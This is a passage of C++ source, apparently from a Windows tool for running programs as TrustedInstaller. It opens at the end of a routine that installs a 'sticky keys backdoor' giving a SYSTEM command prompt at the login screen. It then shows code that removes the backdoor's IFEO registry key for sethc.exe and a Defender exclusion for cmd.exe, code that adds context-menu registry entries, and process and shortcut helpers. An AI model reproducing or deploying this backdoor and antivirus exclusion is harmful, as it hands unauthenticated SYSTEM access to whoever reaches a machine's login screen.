    SUCCESS(L"Sticky keys backdoor installed successfully");
    SUCCESS(L"Press 5x Shift on login screen to get SYSTEM cmd.exe");
    return true;
}

bool TrustedInstallerIntegrator::RemoveStickyKeysBackdoor() noexcept
{
    INFO(L"Removing sticky keys backdoor...");
    
    bool success = true;
    
    std::wstring keyPath = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe";
    LONG result = RegDeleteKeyW(HKEY_LOCAL_MACHINE, keyPath.c_str());
    
    if (result != ERROR_SUCCESS && result != ERROR_FILE_NOT_FOUND) {
        ERROR(L"Failed to remove IFEO registry key: %d", result);
        success = false;
    } else if (result == ERROR_SUCCESS) {
        SUCCESS(L"IFEO registry key removed");
    }
    
    if (!RemoveProcessFromDefenderExclusions(L"cmd.exe")) {
        INFO(L"AV cleanup skipped for cmd.exe");
    }
    
    if (success) {
        SUCCESS(L"Sticky keys backdoor removed successfully");
    } else {
        INFO(L"Sticky keys backdoor removal completed with some errors");
    }
    
    return success;
}

// ============================================================================
// CONTEXT MENU INTEGRATION
// ============================================================================

bool TrustedInstallerIntegrator::AddContextMenuEntries()
{
    wchar_t currentPath[MAX_PATH];
    GetModuleFileNameW(NULL, currentPath, MAX_PATH);
    
    std::wstring command = L"\"";
    command += currentPath;
    command += L"\" trusted \"%1\"";
    
    std::wstring iconPath = L"shell32.dll,77";
    
    HKEY hKey;
    DWORD dwDisposition;
    
    if (RegCreateKeyExW(HKEY_CLASSES_ROOT, L"exefile\\shell\\RunAsTrustedInstaller", 0, NULL, REG_OPTION_NON_VOLATILE, 
                       KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS)
    {
        std::wstring menuText = L"Run as TrustedInstaller";
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)menuText.c_str(), 
                      (DWORD)(menuText.length() + 1) * sizeof(wchar_t));
        RegSetValueExW(hKey, L"Icon", 0, REG_SZ, (const BYTE*)iconPath.c_str(), 
                      (DWORD)(iconPath.length() + 1) * sizeof(wchar_t));
        
        HKEY hCommandKey;
        if (RegCreateKeyExW(hKey, L"command", 0, NULL, REG_OPTION_NON_VOLATILE, 
                           KEY_WRITE, NULL, &hCommandKey, &dwDisposition) == ERROR_SUCCESS)
        {
            RegSetValueExW(hCommandKey, NULL, 0, REG_SZ, (const BYTE*)command.c_str(), 
                          (DWORD)(command.length() + 1) * sizeof(wchar_t));
            RegCloseKey(hCommandKey);
        }
        
        RegCloseKey(hKey);
    }
    
    if (RegCreateKeyExW(HKEY_CLASSES_ROOT, L"lnkfile\\shell\\RunAsTrustedInstaller", 0, NULL, REG_OPTION_NON_VOLATILE,
                       KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS)
    {
        std::wstring menuText = L"Run as TrustedInstaller";
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)menuText.c_str(),
                      (DWORD)(menuText.length() + 1) * sizeof(wchar_t));
        RegSetValueExW(hKey, L"Icon", 0, REG_SZ, (const BYTE*)iconPath.c_str(),
                      (DWORD)(iconPath.length() + 1) * sizeof(wchar_t));
        
        HKEY hCommandKey;
        if (RegCreateKeyExW(hKey, L"command", 0, NULL, REG_OPTION_NON_VOLATILE,
                           KEY_WRITE, NULL, &hCommandKey, &dwDisposition) == ERROR_SUCCESS)
        {
            RegSetValueExW(hCommandKey, NULL, 0, REG_SZ, (const BYTE*)command.c_str(),
                          (DWORD)(command.length() + 1) * sizeof(wchar_t));
            RegCloseKey(hCommandKey);
        }
        
        RegCloseKey(hKey);
    }
    
    SUCCESS(L"Context menu entries added");
    return true;
}

// ============================================================================
// HELPER UTILITIES
// ============================================================================

DWORD TrustedInstallerIntegrator::GetProcessIdByName(LPCWSTR processName)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    DWORD pid = 0;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (wcscmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return pid;
}

bool TrustedInstallerIntegrator::IsLnkFile(LPCWSTR path)
{
    if (!path) return false;
    size_t len = wcslen(path);
    if (len < 4) return false;
    return (_wcsicmp(path + len - 4, L".lnk") == 0);
}

std::wstring TrustedInstallerIntegrator::ResolveLnk(LPCWSTR lnkPath)
{
    IShellLinkW* pShellLink = nullptr;
    IPersistFile* pPersistFile = nullptr;
    wchar_t targetPath[MAX_PATH] = {0};

    HRESULT hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&pShellLink);
    if (FAILED(hr)) return L"";

    hr = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
    if (FAILED(hr)) {
        pShellLink->Release();
        return L"";
    }

    hr = pPersistFile->Load(lnkPath, STGM_READ);
    if (FAILED(hr)) {
        pPersistFile->Release();
        pShellLink->Release();
        return L"";
    }

    hr = pShellLink->GetPath(targetPath, MAX_PATH, NULL, 0);

    pPersistFile->Release();
    pShellLink->Release();

    return (SUCCEEDED(hr) && targetPath[0] != 0) ? std::wstring(targetPath) : L"";
}